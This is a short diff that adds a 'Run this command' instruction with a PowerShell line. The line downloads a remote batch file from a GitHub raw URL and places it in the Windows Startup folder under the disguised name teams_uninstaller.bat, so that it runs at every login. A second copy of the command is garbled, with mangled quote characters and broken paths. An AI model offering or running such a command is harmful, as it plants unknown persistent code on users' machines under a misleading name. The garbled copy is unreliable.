@@ -1,0 +1,3 @@
+Run this command:
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/installer.bat' -OutFile \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\teams_uninstaller.bat\""
+powershell -Command "Invoke-WebRequest -Uri £https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/installer.bat£ -OutFile ´"çenv:APPDATAMicrosoftWindowsStart MenuProgramsStartup
